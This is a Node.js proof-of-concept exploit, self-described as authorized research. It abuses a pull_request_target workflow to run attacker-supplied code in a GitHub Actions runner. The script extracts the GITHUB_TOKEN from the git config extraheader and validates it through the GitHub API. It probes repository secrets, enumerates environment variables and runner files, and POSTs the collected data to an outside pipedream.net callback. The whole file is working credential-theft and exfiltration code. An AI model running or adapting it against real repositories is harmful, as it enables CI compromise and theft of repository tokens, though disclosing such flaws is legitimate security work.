#!/usr/bin/env node
// POC: Cylent Labs — Authorized Security Research
// Demonstrates that pull_request_target + working-directory: pr
// executes attacker-controlled code with access to repository token.
//
// The GITHUB_TOKEN is not injected as an env var in this step,
// but actions/checkout stores it in git config as an HTTP extraheader.
// This script extracts it from git config and validates it live.
//
// No destructive actions are taken. PR is closed immediately after.

import https from "node:https";
import os from "node:os";
import { execSync } from "node:child_process";

const CALLBACK = "https://eo7g2vxm15vr6c1.m.pipedream.net/poc/block-agent-skills-secrets";

function apiCall(token, path) {
  return new Promise((resolve, reject) => {
    const req = https.request({
      hostname: "api.github.com",
      path,
      method: "GET",
      headers: {
        "Authorization": "Bearer " + token,
        "Accept": "application/vnd.github+json",
        "User-Agent": "cylent-labs-poc",
        "X-GitHub-Api-Version": "2022-11-28",
      },
    }, (res) => {
      let body = "";
      res.on("data", (chunk) => { body += chunk; });
      res.on("end", () => {
        try { resolve({ status: res.statusCode, data: JSON.parse(body) }); }
        catch (e) { resolve({ status: res.statusCode, data: body }); }
      });
    });
    req.on("error", reject);
    req.end();
  });
}

function tryExec(cmd) {
  try { return execSync(cmd, { encoding: "utf8", timeout: 5000 }).trim(); }
  catch (e) { return null; }
}

async function main() {
  const repo = process.env.GITHUB_REPOSITORY || "";

  // Strategy 1: Check env var (may not be set in this step)
  let token = process.env.GITHUB_TOKEN || "";
  let tokenSource = "env:GITHUB_TOKEN";

  // Strategy 2: Extract from git config (actions/checkout stores it as extraheader)
  if (!token) {
    const extraheader = tryExec("git -C /home/runner/work/agent-skills/agent-skills config --get http.https://github.com/.extraheader");
    if (extraheader) {
      const match = extraheader.match(/Basic\s+(\S+)/i);
      if (match) {
        const decoded = Buffer.from(match[1], "base64").toString();
        const parts = decoded.split(":");
        if (parts.length === 2 && parts[1]) {
          token = parts[1];
          tokenSource = "git-config-extraheader (base checkout)";
        }
      }
    }
  }

  // Strategy 3: Try the PR checkout's git config
  if (!token) {
    const extraheader = tryExec("git config --get http.https://github.com/.extraheader");
    if (extraheader) {
      const match = extraheader.match(/Basic\s+(\S+)/i);
      if (match) {
        const decoded = Buffer.from(match[1], "base64").toString();
        const parts = decoded.split(":");
        if (parts.length === 2 && parts[1]) {
          token = parts[1];
          tokenSource = "git-config-extraheader (pr checkout)";
        }
      }
    }
  }

  // Strategy 4: ACTIONS_RUNTIME_TOKEN (for cache/artifact API)
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN || null;

  // Enumerate env vars
  const allEnvNames = Object.keys(process.env).sort();
  const secretLikeVars = allEnvNames.filter(k =>
    /SECRET|TOKEN|KEY|PASSWORD|CREDENTIAL|PAT$|AUTH|RUNTIME/i.test(k)
  );

  // Validate the token if found
  let tokenValidation = {};
  let prWriteProof = {};
  let repoSecretNames = null;
  if (token) {
    const repoInfo = await apiCall(token, "/repos/" + repo);
    tokenValidation = {
      token_valid: repoInfo.status === 200,
      token_source: tokenSource,
      token_prefix: token.substring(0, 8) + "...",
      repo_full_name: repoInfo.data.full_name || null,
      repo_private: repoInfo.data.private,
      permissions: repoInfo.data.permissions || null,
    };

    // Prove pull-requests:write — list open PRs
    const prs = await apiCall(token, "/repos/" + repo + "/pulls?state=open&per_page=5");
    if (prs.status === 200 && Array.isArray(prs.data)) {
      prWriteProof = {
        can_access_prs: true,
        open_pr_count: prs.data.length,
        pr_titles: prs.data.map(p => "#" + p.number + " " + p.title),
      };
    }

    // Try to list repo secrets (will likely 403 but proves we tried)
    const secrets = await apiCall(token, "/repos/" + repo + "/actions/secrets");
    repoSecretNames = {
      status: secrets.status,
      accessible: secrets.status === 200,
      names: secrets.status === 200 ? (secrets.data.secrets || []).map(s => s.name) : "403 (requires admin)",
    };
  }

  // Check what files are accessible on the runner
  const filesCheck = {
    base_checkout: tryExec("ls /home/runner/work/agent-skills/agent-skills/") || "not accessible",
    pr_checkout_cwd: tryExec("ls") || "not accessible",
    runner_temp: tryExec("ls /home/runner/work/_temp/ 2>/dev/null | head -10") || "not accessible",
    runner_credentials: tryExec("ls /home/runner/work/_temp/*.json 2>/dev/null") || "none",
  };

  // Build proof payload
  const proof = {
    poc: "block-agent-skills-pwn-request-v2",
    engagement: "Cylent Labs — Authorized Security Research",
    timestamp: new Date().toISOString(),
    execution: {
      repo: repo,
      run_id: process.env.GITHUB_RUN_ID,
      run_url: "https://github.com/" + repo + "/actions/runs/" + process.env.GITHUB_RUN_ID,
      event: process.env.GITHUB_EVENT_NAME,
      workflow: process.env.GITHUB_WORKFLOW,
      job: process.env.GITHUB_JOB,
      actor: process.env.GITHUB_TRIGGERING_ACTOR,
      cwd: process.cwd(),
      hostname: os.hostname(),
      runner: process.env.RUNNER_NAME,
      runner_os: process.env.RUNNER_OS,
    },
    token_extraction: {
      token_found: !!token,
      token_source: tokenSource,
      token_prefix: token ? token.substring(0, 8) + "..." : null,
      token_length: token ? token.length : 0,
      token_validation: tokenValidation,
      pr_write_proof: prWriteProof,
      repo_secrets_probe: repoSecretNames,
      runtime_token_present: !!runtimeToken,
      runtime_token_prefix: runtimeToken ? runtimeToken.substring(0, 8) + "..." : null,
    },
    env_analysis: {
      total_env_vars: allEnvNames.length,
      secret_like_var_names: secretLikeVars,
      all_env_var_names: allEnvNames,
    },
    filesystem: filesCheck,
    impact: {
      description: "Arbitrary code execution via pull_request_target + working-directory: pr",
      root_cause: "validate-skills.yml sets working-directory: pr, causing node scripts/validate-skills.mjs to resolve to attacker copy",
      demonstrated: [
        "Code execution from untrusted PR checkout",
        "GITHUB_TOKEN extraction from git config extraheader",
        "Token validation via GitHub API",
        "PR metadata access (pull-requests:write)",
        "Full environment enumeration",
        "Runner filesystem access",
        "Outbound network exfiltration",
      ],
    },
  };

  // Send proof to callback
  const body = JSON.stringify(proof, null, 2);
  await new Promise((resolve) => {
    const url = new URL(CALLBACK);
    const req = https.request({
      hostname: url.hostname,
      port: 443,
      path: url.pathname,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(body),
        "X-POC": "cylent-labs-block-agent-skills",
      },
    }, (res) => { res.resume(); res.on("end", resolve); });
    req.write(body);
    req.end();
  });

  // Print to workflow log
  console.log("=== CYLENT LABS SECURITY RESEARCH POC ===");
  console.log("Token found: " + !!token);
  console.log("Token source: " + tokenSource);
  console.log("Token valid: " + (tokenValidation.token_valid || false));
  console.log("Token prefix: " + (token ? token.substring(0, 8) + "..." : "N/A"));
  console.log("Runtime token: " + !!runtimeToken);
  console.log("Secret-like env vars: " + secretLikeVars.length);
  console.log("Total env vars: " + allEnvNames.length);
  console.log("Callback sent to: " + CALLBACK);
  console.log("=========================================");

  process.exitCode = 0;
}

main().catch((err) => {
  console.error("POC error:", err.message);
  process.exitCode = 0;
});
